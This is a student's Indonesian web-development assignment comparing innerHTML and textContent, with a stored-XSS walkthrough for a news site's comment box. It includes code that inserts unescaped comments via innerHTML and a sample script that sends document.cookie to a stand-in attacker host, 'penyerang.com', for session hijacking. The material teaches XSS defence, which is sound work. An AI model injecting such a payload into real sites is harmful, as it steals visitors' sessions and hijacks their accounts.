# WAD Assignment 1 — Technical Assignment

Nama : Roby cahya insani
Nim : 25120300006 
Matkul : WAD05

1.	Perbedaan InnerHTML dan textContent
	InnerHTML : mengembalikan atau mengatur markup HTML di dalam sebuah elemen, memungkinkan pemformatan yang kaya dan struktur HTML bersarang
	textContent : Fungsi ini mengambil atau mengatur teks di dalam elemen HTML, terlepas dari visibilitasnya. Tidak seperti `<div>` innerText, textContentfungsi ini tidak mempertimbangkan gaya CSS,

Gunakan textContent Ketika :
-	menampilkan input dari user (nama, komentar, hasil pencarian)
-	ingin aman dari XSS
-	Menampilkan data dari API tidak perlu diformat HTML
Gunakan InnerHTML Ketika;
-	Ingin menyisipkan HTML kompleks 
-	Sumber HTML terpercaya
-	Ingin mengganti seluruh elemen dengan markup baru

Contoh dari InnerHTML ;
 <div id="output"></div>
<script>
  const output = document.getElementById('output');
  output.innerHTML = '<strong>Halo</strong> dunia!';
</script>
# Tag <strong> di-render oleh browser, sehingga "Halo" menjadi tebal.

Contoh dari textContent:
 <div id="output"></div>
<script>
  const output = document.getElementById('output');
  output.textContent = '<strong>Halo</strong> dunia!';
</script>
# Tag <strong> tidak di-render, melainkan ditampilkan sebagai teks apa adanya.

2.	Kolom komentar di situs berita 
Sebuah situs berita memiliki fitur kolom komentar di bawah setiap artikel. Pengunjung bisa mengetik komentar, dan komentar tersebut langsung ditampilkan ke semua pembaca lain. Developer menggunakan innerHTML untuk menampilkan komentar tanpa validasi atau escape.

Deskripsi kerentanan ;
Jenis kerentanan : Stored Cross-site Scripting (XSS)
Penyebab:
•	Input dari user (komentar) tidak divalidasi di sisi server
•	Saat ditampilkan, komentar dimasukkan ke halaman dengan innerHTML
•	Browser mengeksekusi tag <script> yang ada di dalam komentar

Contoh kode :
 //  RENTAN XSS
const komentar = ambilDariDatabase();
document.getElementById('komentar').innerHTML = komentar;

Proses Eksploitasi :
Langkah 1 — Penyerang mengirim komentar berbahaya
Penyerang membuka artikel, lalu mengetik komentar berikut:
<script>
  fetch('https://penyerang.com/steal?cookie=' + document.cookie);
</script>

Langkah 2 — Komentar disimpan di database
Server menyimpan komentar itu tanpa validasi, lalu menampilkannya ke semua pengunjung.

Langkah 3 — Korban membuka halaman
Setiap pengunjung yang membuka artikel akan menjalankan script itu di browser mereka.

Langkah 4 — Cookie terkirim ke penyerang
Script mengirim cookie session korban ke server penyerang:
 https://penyerang.com/steal?cookie=PHPSESSID=abc123...

Langkah 5 — Penyerang membajak akun
Penyerang memakai cookie itu untuk masuk ke akun korban tanpa perlu password.

Dampak 
      Dampak	                     Penjelasan
Pencurian session/cookie :	Penyerangan bisa membajak akun korban
Pencurian data Pribadi : Data seperti email, no hp, Alamat bisa dicuri
Deface halaman web : Penyerangan bisa mengubah tampilan situs
